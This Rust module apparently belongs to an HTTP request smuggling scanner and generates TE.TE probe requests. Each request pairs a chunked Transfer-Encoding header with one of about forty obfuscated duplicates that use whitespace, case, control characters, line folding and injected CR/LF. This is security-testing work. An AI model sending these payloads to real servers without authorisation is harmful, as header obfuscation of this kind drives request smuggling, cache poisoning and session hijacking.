use super::{format_cookies, format_custom_headers};

/// Generate TE.TE (Transfer-Encoding obfuscation) attack payloads
/// These payloads use two Transfer-Encoding headers to test for parser discrepancies
pub fn get_te_te_payloads(
    path: &str,
    host: &str,
    method: &str,
    custom_headers: &[String],
    cookies: &[String],
) -> Vec<String> {
    let custom_header_str = format_custom_headers(custom_headers);
    let cookie_str = format_cookies(cookies);

    let te_variations = vec![
        // === Basic dual header variations ===
        ("Transfer-Encoding: chunked", "Transfer-Encoding: identity"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: x-custom"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: cow"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: compress"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: deflate"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: gzip"),
        // === Reversed dual chunk (revdualchunk) ===
        ("Transfer-Encoding: identity", "Transfer-Encoding: chunked"),
        // === Combined encodings ===
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: gzip, chunked",
        ),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: chunked, identity",
        ),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: identity, chunked",
        ),
        // === Nested encodings (nested) ===
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: identity, chunked, identity",
        ),
        // === Whitespace variations for second header ===
        ("Transfer-Encoding: chunked", " Transfer-Encoding: chunked"),
        ("Transfer-Encoding: chunked", "\tTransfer-Encoding: chunked"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding : chunked"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding:\tchunked"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding:  chunked"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding:chunked"),
        // === Quote variations ===
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: \"chunked\"",
        ),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: 'chunked'"),
        // === Case variations ===
        ("Transfer-Encoding: chunked", "transfer-encoding: chunked"),
        ("Transfer-Encoding: chunked", "TRANSFER-ENCODING: CHUNKED"),
        ("Transfer-Encoding: chunked", "TRANSFER-ENCODING: chunked"),
        ("Transfer-Encoding: chunked", "TrAnSfEr-EnCoDiNg: ChUnKeD"),
        ("Transfer-Encoding: chunked", "Transfer-encoding: chunked"),
        // === Header name variations ===
        ("Transfer-Encoding: chunked", "Transfer_Encoding: chunked"),
        ("Transfer-Encoding: chunked", "Transfer Encoding: chunked"),
        ("Transfer-Encoding: chunked", "Transfer\\Encoding: chunked"),
        // === Line folding variations ===
        ("Transfer-Encoding: chunked", "Transfer-Encoding:\n chunked"),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding:\r\n chunked",
        ),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding:\r\n\tchunked",
        ),
        // === Control character variations ===
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding:\x0Bchunked",
        ),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: chunked\r"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: chunked\t"),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: chunked\x00",
        ),
        // === Truncated/lazygrep variation ===
        ("Transfer-Encoding: chunked", "Transfer-Encoding: chunk"),
        // === Bad setup line endings ===
        (
            "Transfer-Encoding: chunked",
            "Foo: bar\rTransfer-Encoding: chunked",
        ),
        (
            "Transfer-Encoding: chunked",
            "Foo: bar\nTransfer-Encoding: chunked",
        ),
        // === Content-Encoding confusion (contentEnc) ===
        ("Transfer-Encoding: chunked", "Content-Encoding: chunked"),
        // === URL-encoded variations ===
        ("Transfer-Encoding: chunked", "Transfer-%45ncoding: chunked"),
        // === Connection header combination ===
        (
            "Transfer-Encoding: chunked",
            "Connection: Transfer-Encoding\r\nTransfer-Encoding: chunked",
        ),
    ];

    // Add extended ASCII variations for TE.TE (bytes > 0x7F)
    let extended_te_te_variations: Vec<(String, String)> = vec![
        // NEL character (0x85)
        (
            "Transfer-Encoding: chunked".to_string(),
            format!(
                "Transfer-Encoding{}: chunked",
                String::from_utf8_lossy(&[0x85])
            ),
        ),
        // NBSP (0xA0)
        (
            "Transfer-Encoding: chunked".to_string(),
            format!(
                "Transfer-Encoding{}: chunked",
                String::from_utf8_lossy(&[0xA0])
            ),
        ),
    ];

    let mut payloads = Vec::with_capacity(te_variations.len() + extended_te_te_variations.len());
    for (te1, te2) in te_variations {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
            Host: {}\r\n\
            {}\
            {}\
            Content-Length: 4\r\n\
            {}\r\n\
            {}\r\n\
            \r\n\
            1\r\n\
            A\r\n\
            0\r\n\
            \r\n",
            method, path, host, custom_header_str, cookie_str, te1, te2
        ));
    }

    // Add extended ASCII variations
    for (te1, te2) in extended_te_te_variations {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
            Host: {}\r\n\
            {}\
            {}\
            Content-Length: 4\r\n\
            {}\r\n\
            {}\r\n\
            \r\n\
            1\r\n\
            A\r\n\
            0\r\n\
            \r\n",
            method, path, host, custom_header_str, cookie_str, te1, te2
        ));
    }

    payloads
}
